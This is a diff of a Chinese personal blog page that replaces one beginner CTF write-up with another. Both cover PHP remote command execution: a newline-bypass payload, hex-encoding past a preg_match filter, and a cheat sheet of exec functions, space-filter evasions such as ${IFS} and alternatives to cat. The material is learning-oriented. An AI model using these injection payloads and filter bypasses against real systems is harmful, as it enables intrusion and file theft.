@@ -3,27 +3,27 @@
 <head>
   <meta charset="utf-8">
   
-  <title>baba童鞋的web第一天记录 | baba童鞋的博客</title>
+  <title>basic.rce2 | baba童鞋的博客</title>
 
   <!-- keywords -->
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="今天，写了web小分队里发的一道web基础题，它是关于php简单绕过的。  具体wp如下  首先打开网址，会看到以下内容    根据内容，可以看出是一道php换行符绕过题（%0a），我们在网址上输入以下命令  【GET】 &#x2F;?a&#x3D;system(%27%0acat%20f*%20|%20base64%27)；    成功绕过！  根据内容可以看出时base64编码，在百度上搜索base64在线解">
+  <meta name="description" content="今天写了rce基础题，题目如下    根据内容可以知道这是一道preg match正则绕过题，命令执行函数的过滤，而且是cat等被过滤掉。  那我们就要绕过cat等内容  我们通过构造？Rem&#x3D;system(“Is”)查看目录文件（i是大写，因为结尾的i是不区分大小写，可以执行此命令，得到文件名    我们可通过编码绕过，输入以下get命令：index.php?Rem&#x3D;system(“\x63">
 <meta property="og:type" content="article">
-<meta property="og:title" content="baba童鞋的web第一天记录">
-<meta property="og:url" content="http://example.com/2020/11/23/biubiubiu/index.html">
+<meta property="og:title" content="basic.rce2">
+<meta property="og:url" content="http://example.com/2020/11/26/basic-rce2/index.html">
 <meta property="og:site_name" content="baba童鞋的博客">
-<meta property="og:description" content="今天，写了web小分队里发的一道web基础题，它是关于php简单绕过的。  具体wp如下  首先打开网址，会看到以下内容    根据内容，可以看出是一道php换行符绕过题（%0a），我们在网址上输入以下命令  【GET】 &#x2F;?a&#x3D;system(%27%0acat%20f*%20|%20base64%27)；    成功绕过！  根据内容可以看出时base64编码，在百度上搜索base64在线解">
+<meta property="og:description" content="今天写了rce基础题，题目如下    根据内容可以知道这是一道preg match正则绕过题，命令执行函数的过滤，而且是cat等被过滤掉。  那我们就要绕过cat等内容  我们通过构造？Rem&#x3D;system(“Is”)查看目录文件（i是大写，因为结尾的i是不区分大小写，可以执行此命令，得到文件名    我们可通过编码绕过，输入以下get命令：index.php?Rem&#x3D;system(“\x63">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2020/11/23/biubiubiu/web1.png">
-<meta property="og:image" content="http://example.com/2020/11/23/biubiubiu/web2.png">
-<meta property="og:image" content="http://example.com/2020/11/23/biubiubiu/web3.png">
-<meta property="article:published_time" content="2020-11-23T09:27:50.000Z">
-<meta property="article:modified_time" content="2020-11-23T09:47:08.151Z">
+<meta property="og:image" content="http://example.com/2020/11/26/basic-rce2/rce1.png">
+<meta property="og:image" content="http://example.com/2020/11/26/basic-rce2/rce2.png">
+<meta property="og:image" content="http://example.com/2020/11/26/basic-rce2/rce3.png">
+<meta property="article:published_time" content="2020-11-26T14:14:08.000Z">
+<meta property="article:modified_time" content="2020-11-27T11:52:51.704Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2020/11/23/biubiubiu/web1.png">
+<meta name="twitter:image" content="http://example.com/2020/11/26/basic-rce2/rce1.png">
   
     <link rel="alternative" href="/atom.xml" title="baba童鞋的博客" type="application/atom+xml">
   
@@ -181,11 +181,11 @@
 		</header>				
 	</div>
 </nav>
-      <div class="body-wrap"><article id="post-biubiubiu" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-basic-rce2" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/11/23/biubiubiu/" class="article-date">
-  	<time datetime="2020-11-23T09:27:50.000Z" itemprop="datePublished">2020-11-23</time>
+      <a href="/2020/11/26/basic-rce2/" class="article-date">
+  	<time datetime="2020-11-26T14:14:08.000Z" itemprop="datePublished">2020-11-26</time>
 </a>
     </div>
   
@@ -198,7 +198,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      baba童鞋的web第一天记录
+      basic.rce2
       
     </h1>
   
@@ -212,8 +212,8 @@
         
           
 <div class="counter-tag counter">
-    <span id="/2020/11/23/biubiubiu/" class="leancloud_visitors post-title-link"
-          style="font-size: 12px" data-flag-title="baba童鞋的web第一天记录">
+    <span id="/2020/11/26/basic-rce2/" class="leancloud_visitors post-title-link"
+          style="font-size: 12px" data-flag-title="basic.rce2">
          &nbsp;
         view
     </span>
@@ -226,7 +226,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>  今天，写了web小分队里发的一道web基础题，它是关于php简单绕过的。<br>  具体wp如下<br>  首先打开网址，会看到以下内容<br>  <img src="/2020/11/23/biubiubiu/web1.png"><br>  根据内容，可以看出是一道php换行符绕过题（%0a），我们在网址上输入以下命令<br>  【GET】 /?a=system(%27%0acat%20f*%20|%20base64%27)；<br>  <img src="/2020/11/23/biubiubiu/web2.png"><br>  成功绕过！<br>  根据内容可以看出时base64编码，在百度上搜索base64在线解码器，进行在线解码<br>  <img src="/2020/11/23/biubiubiu/web3.png"><br>  dingdong!成功得到flag~<br>  （baba童鞋还是可以正经滴）</p>
+        <p>  今天写了rce基础题，题目如下<br>  <img src="/2020/11/26/basic-rce2/rce1.png"><br>  根据内容可以知道这是一道preg match正则绕过题，命令执行函数的过滤，而且是cat等被过滤掉。<br>  那我们就要绕过cat等内容<br>  我们通过构造？Rem=system(“Is”)查看目录文件（i是大写，因为结尾的i是不区分大小写，可以执行此命令，得到文件名<br>  <img src="/2020/11/26/basic-rce2/rce2.png"><br>  我们可通过编码绕过，输入以下get命令：index.php?Rem=system(“\x63\x61\x74\x20\x66\x6c\x61\x67”);<br>  <img src="/2020/11/26/basic-rce2/rce3.png"><br>  成功得到flag~<br>  ————————<br>  注：<br>  命令执行的函数有很多，如下：<br>  system()<br>  passthru()<br>  exec()<br>  shell_exec()<br>  popen()<br>  proc_open()<br>  pcntl_exec()</p>
+<p>  反引号 同shell_exec()<br>  其中，只有system函数是有回显的，其他的函数可以通过echo等显示。<br>  ————————<br>  其他的一些绕过<br>  ————————<br>空格绕过：<br>  1，&gt; &lt; &lt;&gt; 重定向符<br>  2，%09(需要php环境)<br>  3，${IFS}<br>  4，$IFS$9<br>  5，{cat,flag.php} //用逗号实现了空格功能<br>  6，%20<br>  7，%09<br>  ————————<br>cat被过滤：<br>  1，more:一页一页的显示档案内容<br>  2，less:与 more 类似<br>  3，head:查看头几行<br>  4，tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>  5，tail:查看尾几行<br>  6，nl：显示的时候，顺便输出行号<br>  7，od:以二进制的方式读取档案内容<br>  8，vi:一种编辑器，这个也可以查看<br>  9，vim:一种编辑器，这个也可以查看<br>  10，sort:可以查看<br>  11，uniq:可以查看<br>  12，file -f:报错出具体内容<br>  ————————<br>  （具体内容可访问：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13797436.html">https://www.cnblogs.com/NPFS/p/13797436.html</a> )</p>
 
       
     </div>
@@ -236,18 +237,18 @@
     
 <nav id="article-nav">
   
-    <a href="/2020/11/24/bianliang/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/11/27/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%962/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">&lt;</strong>
       <div class="article-nav-title">
         
-          被摧残的第二天
+          php变量覆盖2
         
       </div>
     </a>
   
   
-    <a href="/2020/11/19/balabala/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">准霸霸的leetcode第一次提交</div>
+    <a href="/2020/11/25/bugku/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">three，three，three~~</div>
       <strong class="article-nav-caption">&gt;</strong>
     </a>
   
@@ -257,7 +258,7 @@
 </article>
 
 
-<div class="ds-share share" data-thread-key="biubiubiu" data-title="baba童鞋的web第一天记录" data-url="http://example.com/2020/11/23/biubiubiu/"  data-images="/img/huahua.jpg" data-content="baba童鞋的web第一天记录">
+<div class="ds-share share" data-thread-key="basic-rce2" data-title="basic.rce2" data-url="http://example.com/2020/11/26/basic-rce2/"  data-images="/img/huahua.jpg" data-content="basic.rce2">
     <div class="ds-share-inline">
       <ul  class="ds-share-icons-16">
       	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
